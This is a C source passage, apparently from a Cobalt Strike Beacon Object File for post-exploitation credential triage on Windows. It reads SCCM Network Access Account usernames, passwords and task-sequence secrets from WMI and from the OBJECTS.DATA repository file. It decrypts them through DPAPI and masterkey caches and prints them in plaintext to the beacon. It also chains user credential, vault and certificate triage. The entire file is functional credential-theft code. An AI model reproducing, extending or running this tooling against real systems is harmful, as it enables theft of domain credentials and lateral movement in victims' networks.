    if (!data || start < 0 || end < start) return NULL;
    int len = end - start;
    if (len <= 0 || len > 16384) return NULL;
    char* out = (char*)intAlloc(len + 1);
    if (!out) return NULL;
    memcpy(out, data + start, len);
    out[len] = 0;
    return out;
}

static BOOL is_hex_char(char c) {
    return ((c >= '0' && c <= '9') ||
            (c >= 'a' && c <= 'f') ||
            (c >= 'A' && c <= 'F'));
}

static char* extract_longest_hex_blob(const char* text) {
    int best_start = -1;
    int best_len = 0;
    int run_start = -1;
    int run_len = 0;

    if (!text) return NULL;

    for (int i = 0;; i++) {
        char c = text[i];
        if (is_hex_char(c)) {
            if (run_len == 0) run_start = i;
            run_len++;
        } else {
            int candidate_len = run_len - (run_len % 2);
            if (candidate_len >= 16 && candidate_len > best_len) {
                best_start = run_start;
                best_len = candidate_len;
            }
            run_start = -1;
            run_len = 0;
            if (c == '\0') break;
        }
    }

    if (best_start < 0 || best_len <= 0) return NULL;
    return extract_ascii((const BYTE*)text, best_start, best_start + best_len);
}

static char* extract_wmi_policy_secret_hex(const wchar_t* value) {
    char* utf8 = NULL;
    char* hex = NULL;

    if (!value) return NULL;

    utf8 = wide_to_utf8(value);
    if (!utf8) return NULL;

    hex = extract_longest_hex_blob(utf8);
    intFree(utf8);
    return hex;
}

static int find_bytes_in_range(const BYTE* data, int data_len, int start, int end,
                               const BYTE* needle, int needle_len) {
    int pos;

    if (!data || !needle || data_len <= 0 || needle_len <= 0) return -1;
    if (start < 0) start = 0;
    if (end > data_len) end = data_len;
    if (start >= end || start + needle_len > end) return -1;

    pos = find_bytes(data, data_len, start, needle, needle_len);
    if (pos < 0 || pos + needle_len > end) return -1;
    return pos;
}

static char* extract_policy_secret_hex_after(const BYTE* data, int data_len,
                                             int anchor, int end) {
    int open;
    int secret_start;
    int close;

    if (!data || data_len <= 0) return NULL;
    if (anchor < 0) anchor = 0;
    if (end > data_len) end = data_len;
    if (anchor >= end) return NULL;

    open = find_bytes_in_range(data, data_len, anchor, end,
                               SCCM_POLICY_OPEN, (int)(sizeof(SCCM_POLICY_OPEN) - 1));
    if (open < 0) return NULL;

    secret_start = open + (int)(sizeof(SCCM_POLICY_OPEN) - 1);
    close = find_bytes_in_range(data, data_len, secret_start, end,
                                SCCM_CDATA_CLOSE, (int)(sizeof(SCCM_CDATA_CLOSE) - 1));
    if (close < 0) return NULL;

    return extract_ascii(data, secret_start, close);
}

static char* secret_bytes_to_utf8(const BYTE* data, int data_len) {
    int utf16_len;
    char* utf8;
    char* ascii;
    int trimmed;

    if (!data || data_len <= 0) return NULL;

    utf16_len = data_len;
    while (utf16_len >= 2 &&
           data[utf16_len - 2] == 0 &&
           data[utf16_len - 1] == 0) {
        utf16_len -= 2;
    }

    if (utf16_len > 0 &&
        (utf16_len % 2) == 0 &&
        looks_like_utf16le(data, utf16_len)) {
        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
        if (!wtmp) return NULL;
        memcpy(wtmp, data, utf16_len);
        wtmp[utf16_len / 2] = L'\0';
        utf8 = wide_to_utf8(wtmp);
        intFree(wtmp);
        return utf8;
    }

    trimmed = data_len;
    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
    if (trimmed <= 0 || trimmed > 16384) return NULL;

    ascii = (char*)intAlloc(trimmed + 1);
    if (!ascii) return NULL;
    memcpy(ascii, data, trimmed);
    ascii[trimmed] = '\0';
    return ascii;
}

static BOOL looks_like_utf16le(const BYTE* data, int data_len) {
    if (!data || data_len < 4 || (data_len % 2) != 0) return FALSE;

    int pairs = data_len / 2;
    int high_zero = 0;
    int printable = 0;

    for (int i = 0; i < data_len; i += 2) {
        BYTE lo = data[i];
        BYTE hi = data[i + 1];
        if (hi == 0) high_zero++;
        if ((lo >= 0x20 && lo <= 0x7E) || lo == 0x09 || lo == 0x0A || lo == 0x0D)
            printable++;
    }

    return (high_zero >= (pairs * 6 / 10)) && (printable > 0);
}

static void print_secret_value(const char* label, const BYTE* data, int data_len) {
    if (!label || !data || data_len <= 0) return;

    int utf16_len = data_len;
    while (utf16_len >= 2 &&
           data[utf16_len - 2] == 0 &&
           data[utf16_len - 1] == 0) {
        utf16_len -= 2;
    }

    if (utf16_len > 0 &&
        (utf16_len % 2) == 0 &&
        looks_like_utf16le(data, utf16_len)) {
        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
        if (wtmp) {
            memcpy(wtmp, data, utf16_len);
            wtmp[utf16_len / 2] = L'\0';
            char* utf8 = wide_to_utf8(wtmp);
            if (utf8) {
                BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s\n", label, utf8);
                intFree(utf8);
                intFree(wtmp);
                return;
            }
            intFree(wtmp);
        }
    }

    int trimmed = data_len;
    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
    if (trimmed <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "    %s : <empty>\n", label);
        return;
    }

    char* hex = bytes_to_hex(data, trimmed);
    if (hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    %s (hex) : %s\n", label, hex);
        intFree(hex);
    }
}

static BOOL is_sccm_machine_account_value(const BYTE* data, int data_len) {
    static const BYTE marker[] = { 0x00, 0x00, 0x0E, 0x0E, 0x0E };

    if (!data || data_len < (int)sizeof(marker)) return FALSE;
    return (memcmp(data, marker, sizeof(marker)) == 0);
}

static BOOL decrypt_sccm_secret_hex(const char* secret_hex,
                                    MASTERKEY_CACHE* cache,
                                    BYTE** out_data, int* out_len) {
    if (!secret_hex || !out_data || !out_len) return FALSE;
    *out_data = NULL;
    *out_len = 0;

    int hex_len = (int)strlen(secret_hex);
    if (hex_len < 16 || (hex_len % 2) != 0 || hex_len > (1024 * 1024)) return FALSE;
    for (int i = 0; i < hex_len; i++) {
        char c = secret_hex[i];
        BOOL is_hex = ((c >= '0' && c <= '9') ||
                       (c >= 'a' && c <= 'f') ||
                       (c >= 'A' && c <= 'F'));
        if (!is_hex) return FALSE;
    }

    int raw_len = 0;
    BYTE* raw = hex_to_bytes(secret_hex, &raw_len);
    if (!raw || raw_len <= 0) return FALSE;

    /* Prefer local DPAPI unprotect for on-host SCCM secrets. */
    for (int candidate = 0; candidate < 2; candidate++) {
        int off = (candidate == 0) ? 4 : 0;
        int len = raw_len - off;
        if (len < 44) continue;
        const BYTE* p = raw + off;
        if (*(DWORD*)p != 1) continue;
        if (!(p[4] == 0xD0 && p[5] == 0x8C && p[6] == 0x9D && p[7] == 0xDF)) continue;

        DATA_BLOB in;
        DATA_BLOB out;
        memset(&in, 0, sizeof(in));
        memset(&out, 0, sizeof(out));
        in.pbData = (BYTE*)p;
        in.cbData = (DWORD)len;

#ifdef BOF
        if (CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
            out.pbData && out.cbData > 0) {
            BYTE* copied = (BYTE*)intAlloc(out.cbData);
            if (copied) {
                memcpy(copied, out.pbData, out.cbData);
                *out_data = copied;
                *out_len = (int)out.cbData;
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
                intFree(raw);
                return TRUE;
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
        }
#else
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
            out.pbData && out.cbData > 0) {
            BYTE* copied = (BYTE*)intAlloc(out.cbData);
            if (copied) {
                memcpy(copied, out.pbData, out.cbData);
                *out_data = copied;
                *out_len = (int)out.cbData;
                HeapFree(GetProcessHeap(), 0, out.pbData);
                intFree(raw);
                return TRUE;
            }
            HeapFree(GetProcessHeap(), 0, out.pbData);
        }
#endif
    }

    BOOL ok = FALSE;
    DPAPI_BLOB blob;
    memset(&blob, 0, sizeof(blob));

    const BYTE* dpapi_ptr = raw;
    int dpapi_len = raw_len;
    BOOL parsed = FALSE;

    if (raw_len > 4) {
        dpapi_ptr = raw + 4;
        dpapi_len = raw_len - 4;
        parsed = parse_dpapi_blob(dpapi_ptr, dpapi_len, &blob);
    }

    if (!parsed) {
        dpapi_ptr = raw;
        dpapi_len = raw_len;
        parsed = parse_dpapi_blob(dpapi_ptr, dpapi_len, &blob);
    }

    if (parsed) {
        BYTE* mk_sha1 = cache ? mk_cache_lookup(cache, &blob.masterkey_guid) : NULL;
        if (mk_sha1) {
                ok = decrypt_blob(blob.data, blob.data_len,
                                  blob.salt, blob.salt_len,
                                  mk_sha1, 20,
                                  blob.alg_crypt, blob.alg_hash,
                                  out_data, out_len);
        }
        free_dpapi_blob(&blob);
    }

    intFree(raw);
    return ok;
}

static int triage_sccm_secret(const char* label,
                              const char* protected_hex,
                              MASTERKEY_CACHE* cache,
                              BOOL* machine_account) {
    BYTE* decrypted = NULL;
    int decrypted_len = 0;
    BOOL ok = FALSE;

    if (!label) return 0;

    if (!protected_hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] %s blob was not found\n", label);
        return 0;
    }

    ok = decrypt_sccm_secret_hex(protected_hex, cache, &decrypted, &decrypted_len);
    if (ok) {
        char* text = secret_bytes_to_utf8(decrypted, decrypted_len);
        print_secret_value(label, decrypted, decrypted_len);
        if (text) {
            if (strstr(text, "<PolicyXML") && strstr(text, "Compression=\"zlib\"")) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "    [*] Decrypted SCCM policy XML uses zlib compression; BOF decompression is not implemented yet\n");
            }
            intFree(text);
        }
        if (machine_account && is_sccm_machine_account_value(decrypted, decrypted_len)) {
            *machine_account = TRUE;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] Failed to decrypt %s blob\n", label);
    }

    if (decrypted) intFree(decrypted);
    return ok ? 1 : 0;
}

static int triage_sccm_disk_naa(const BYTE* data, int data_len, MASTERKEY_CACHE* cache) {
    int pos = 0;
    int accounts = 0;
    int decrypted = 0;

    while (pos < data_len) {
        int class_pos;
        int next_class_pos;
        int region_end;
        int pass_prop_pos;
        int user_prop_pos;
        char* pass_hex = NULL;
        char* user_hex = NULL;
        BOOL machine_account = FALSE;

        class_pos = find_bytes(data, data_len, pos,
                               SCCM_NAA_CLASS_TAG, (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1));
        if (class_pos < 0) break;

        next_class_pos = find_bytes(data, data_len,
                                    class_pos + (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1),
                                    SCCM_NAA_CLASS_TAG, (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1));
        region_end = data_len;
        if (next_class_pos >= 0 && next_class_pos < region_end) region_end = next_class_pos;
        if (class_pos + 32768 < region_end) region_end = class_pos + 32768;

        pass_prop_pos = find_bytes_in_range(data, data_len, class_pos, region_end,
                                            SCCM_NAA_PASS_PROP, (int)(sizeof(SCCM_NAA_PASS_PROP) - 1));
        user_prop_pos = find_bytes_in_range(data, data_len, class_pos, region_end,
                                            SCCM_NAA_USER_PROP, (int)(sizeof(SCCM_NAA_USER_PROP) - 1));

        if (pass_prop_pos >= 0) {
            int pass_end = region_end;
            if (user_prop_pos > pass_prop_pos && user_prop_pos < pass_end) pass_end = user_prop_pos;
            pass_hex = extract_policy_secret_hex_after(data, data_len, pass_prop_pos, pass_end);
        }
        if (user_prop_pos >= 0) {
            user_hex = extract_policy_secret_hex_after(data, data_len, user_prop_pos, region_end);
        }

        if (!pass_hex || !user_hex) {
            /* SharpSCCM/SCCMHunter order for disk NAA records is password then username. */
            if (!pass_hex) {
                pass_hex = extract_policy_secret_hex_after(data, data_len, class_pos, region_end);
            }
            if (!user_hex && pass_hex) {
                int first_open = find_bytes_in_range(data, data_len, class_pos, region_end,
                                                     SCCM_POLICY_OPEN, (int)(sizeof(SCCM_POLICY_OPEN) - 1));
                if (first_open >= 0) {
                    int after_first = first_open + (int)(sizeof(SCCM_POLICY_OPEN) - 1);
                    int first_close = find_bytes_in_range(data, data_len, after_first, region_end,
                                                          SCCM_CDATA_CLOSE, (int)(sizeof(SCCM_CDATA_CLOSE) - 1));
                    if (first_close >= 0) {
                        user_hex = extract_policy_secret_hex_after(data, data_len,
                                                                   first_close + (int)(sizeof(SCCM_CDATA_CLOSE) - 1),
                                                                   region_end);
                    }
                }
            }
        }

        if (pass_hex || user_hex) {
            accounts++;
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);
            decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, cache, &machine_account);
            decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, cache, &machine_account);
            if (machine_account) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
            }
        }

        if (pass_hex) intFree(pass_hex);
        if (user_hex) intFree(user_hex);

        pos = class_pos + (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1);
    }

    if (accounts == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries\n");
    }

    return decrypted;
}

static int triage_sccm_disk_task_sequences(const BYTE* data, int data_len, MASTERKEY_CACHE* cache) {
    int pos = 0;
    int sequences = 0;
    int decrypted = 0;

    while (pos < data_len) {
        int anchor_pos;
        int next_anchor_pos;
        int region_end;
        char* secret_hex;

        anchor_pos = find_bytes(data, data_len, pos,
                                SCCM_TS_ANCHOR, (int)(sizeof(SCCM_TS_ANCHOR) - 1));
        if (anchor_pos < 0) break;

        next_anchor_pos = find_bytes(data, data_len,
                                     anchor_pos + (int)(sizeof(SCCM_TS_ANCHOR) - 1),
                                     SCCM_TS_ANCHOR, (int)(sizeof(SCCM_TS_ANCHOR) - 1));
        region_end = data_len;
        if (next_anchor_pos >= 0 && next_anchor_pos < region_end) region_end = next_anchor_pos;
        if (anchor_pos + 65536 < region_end) region_end = anchor_pos + 65536;

        secret_hex = extract_policy_secret_hex_after(data, data_len, anchor_pos, region_end);
        if (secret_hex) {
            sequences++;
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Task Sequence #%d\n", sequences);
            decrypted += triage_sccm_secret("Plaintext Task Sequence", secret_hex, cache, NULL);
            intFree(secret_hex);
        }

        pos = anchor_pos + (int)(sizeof(SCCM_TS_ANCHOR) - 1);
    }

    if (sequences == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM task sequence entries\n");
    }

    return decrypted;
}

BOOL triage_sccm_wmi(void) {
    static const wchar_t namespace_path[] = L"ROOT\\ccm\\policy\\Machine\\ActualConfig";
    static const wchar_t query_text[] =
        L"SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount";

    HRESULT hr;
    BOOL com_initialized = FALSE;
    BOOL result = FALSE;
    IWbemLocator* locator = NULL;
    IWbemServices* services = NULL;
    IEnumWbemClassObject* enumerator = NULL;
    BSTR ns = NULL;
    BSTR lang = NULL;
    BSTR query = NULL;
    int accounts = 0;
    int decrypted = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM source: WMI %S\n", namespace_path);

#ifdef BOF
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
#else
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
#endif
    if (SUCCEEDED(hr)) {
        com_initialized = TRUE;
    } else if (hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeEx failed: 0x%08lx\n", hr);
        goto cleanup;
    }

#ifdef BOF
    hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL,
                                    RPC_C_AUTHN_LEVEL_DEFAULT,
                                    RPC_C_IMP_LEVEL_IMPERSONATE,
                                    NULL, EOAC_NONE, NULL);
#else
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                              RPC_C_AUTHN_LEVEL_DEFAULT,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, EOAC_NONE, NULL);
#endif
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeSecurity failed: 0x%08lx\n", hr);
        goto cleanup;
    }

#ifdef BOF
    hr = OLE32$CoCreateInstance(&SCCM_WBEM_LOCATOR_CLSID, NULL, CLSCTX_INPROC_SERVER,
                                &SCCM_IID_WBEM_LOCATOR, (LPVOID*)&locator);
#else
    hr = CoCreateInstance(&SCCM_WBEM_LOCATOR_CLSID, NULL, CLSCTX_INPROC_SERVER,
                          &SCCM_IID_WBEM_LOCATOR, (LPVOID*)&locator);
#endif
    if (FAILED(hr) || !locator) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance(IWbemLocator) failed: 0x%08lx\n", hr);
        goto cleanup;
    }

#ifdef BOF
    ns = OLEAUT32$SysAllocString(namespace_path);
    lang = OLEAUT32$SysAllocString(L"WQL");
    query = OLEAUT32$SysAllocString(query_text);
#else
    ns = SysAllocString(namespace_path);
    lang = SysAllocString(L"WQL");
    query = SysAllocString(query_text);
#endif
    if (!ns || !lang || !query) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate WMI query strings\n");
        goto cleanup;
    }

    hr = IWbemLocator_ConnectServer(locator, ns, NULL, NULL, NULL, 0, NULL, NULL, &services);
    if (FAILED(hr) || !services) {
        if (hr == (HRESULT)0x8004100e) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] SCCM WMI namespace %S does not exist on this host (0x%08lx)\n",
                         namespace_path, hr);
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] CRED-3 requires a live SCCM client policy namespace\n");
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] This usually means the host is not an active SCCM client, or the live policy namespace is unavailable\n");
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] Try the disk/CRED-4 path against OBJECTS.DATA instead\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] IWbemLocator::ConnectServer failed: 0x%08lx\n", hr);
        }
        goto cleanup;
    }

#ifdef BOF
    hr = OLE32$CoSetProxyBlanket((IUnknown*)services,
                                 RPC_C_AUTHN_WINNT,
                                 RPC_C_AUTHZ_NONE,
                                 NULL,
                                 RPC_C_AUTHN_LEVEL_CALL,
                                 RPC_C_IMP_LEVEL_IMPERSONATE,
                                 NULL,
                                 EOAC_NONE);
#else
    hr = CoSetProxyBlanket((IUnknown*)services,
                           RPC_C_AUTHN_WINNT,
                           RPC_C_AUTHZ_NONE,
                           NULL,
                           RPC_C_AUTHN_LEVEL_CALL,
                           RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL,
                           EOAC_NONE);
#endif
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoSetProxyBlanket failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    hr = IWbemServices_ExecQuery(services, lang, query,
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &enumerator);
    if (FAILED(hr) || !enumerator) {
        BeaconPrintf(CALLBACK_ERROR, "[!] IWbemServices::ExecQuery failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    for (;;) {
        IWbemClassObject* object = NULL;
        ULONG returned = 0;
        VARIANT username_value;
        VARIANT password_value;
        char* user_hex = NULL;
        char* pass_hex = NULL;
        BOOL machine_account = FALSE;

        memset(&username_value, 0, sizeof(username_value));
        memset(&password_value, 0, sizeof(password_value));

        hr = IEnumWbemClassObject_Next(enumerator, WBEM_INFINITE, 1, &object, &returned);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] IEnumWbemClassObject::Next failed: 0x%08lx\n", hr);
            break;
        }
        if (returned == 0 || !object) break;

        accounts++;
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);

        if (SUCCEEDED(IWbemClassObject_Get(object, L"NetworkAccessUsername", 0, &username_value, NULL, NULL)) &&
            V_VT(&username_value) == VT_BSTR && V_BSTR(&username_value)) {
            user_hex = extract_wmi_policy_secret_hex(V_BSTR(&username_value));
        }

        if (SUCCEEDED(IWbemClassObject_Get(object, L"NetworkAccessPassword", 0, &password_value, NULL, NULL)) &&
            V_VT(&password_value) == VT_BSTR && V_BSTR(&password_value)) {
            pass_hex = extract_wmi_policy_secret_hex(V_BSTR(&password_value));
        }

        decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, NULL, &machine_account);
        decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, NULL, &machine_account);

        if (machine_account) {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
        }

        if (user_hex) intFree(user_hex);
        if (pass_hex) intFree(pass_hex);
#ifdef BOF
        OLEAUT32$VariantClear(&username_value);
        OLEAUT32$VariantClear(&password_value);
#else
        VariantClear(&username_value);
        VariantClear(&password_value);
#endif
        IWbemClassObject_Release(object);
    }

    if (accounts == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries in WMI\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "\n[*] SCCM WMI triage complete: %d account entries, %d decrypted secrets\n",
                     accounts, decrypted);
    }

    result = (decrypted > 0);

cleanup:
    if (enumerator) IEnumWbemClassObject_Release(enumerator);
    if (services) IWbemServices_Release(services);
    if (locator) IWbemLocator_Release(locator);
#ifdef BOF
    if (query) OLEAUT32$SysFreeString(query);
    if (lang) OLEAUT32$SysFreeString(lang);
    if (ns) OLEAUT32$SysFreeString(ns);
    if (com_initialized) OLE32$CoUninitialize();
#else
    if (query) SysFreeString(query);
    if (lang) SysFreeString(lang);
    if (ns) SysFreeString(ns);
    if (com_initialized) CoUninitialize();
#endif

    return result;
}

BOOL triage_sccm_disk(MASTERKEY_CACHE* cache, const wchar_t* target) {

    const wchar_t* objects_path = target;
    wchar_t default_path[] = L"C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA";
    if (!objects_path || wcslen(objects_path) == 0) {
        objects_path = default_path;
    }

    char* path_utf8 = wide_to_utf8(objects_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM source file: %s\n", path_utf8 ? path_utf8 : "?");
    if (path_utf8) intFree(path_utf8);

    BYTE* data = NULL;
    int data_len = 0;
    if (!read_file_bytes(objects_path, &data, &data_len)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read SCCM OBJECTS.DATA (Win32: %lu)\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    int decrypted = 0;

    decrypted += triage_sccm_disk_naa(data, data_len, cache);
    decrypted += triage_sccm_disk_task_sequences(data, data_len, cache);

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] SCCM disk triage complete: %d decrypted secrets\n",
        decrypted);

    intFree(data);
    return (decrypted > 0);
}

BOOL triage_user_full(MASTERKEY_CACHE* cache,
                      const BYTE* pvk, int pvk_len,
                      const char* password, const char* ntlm,
                      const char* credkey, BOOL use_rpc,
                      const wchar_t* target, const wchar_t* server,
                      BOOL show_all) {
    /* Full user triage: masterkeys + creds + vaults + certs */
    triage_user_masterkeys(cache, pvk, pvk_len, password, ntlm,
                           credkey, use_rpc, target, server, FALSE, NULL);

    if (cache->count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No masterkeys decrypted — cannot proceed with triage\n");
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Credentials ---\n");
    triage_user_creds(cache, target, server, FALSE);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Vaults ---\n");
    triage_user_vaults(cache, target, server);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Certificates ---\n");
    triage_user_certs(cache, target, server, show_all);

    return TRUE;
}
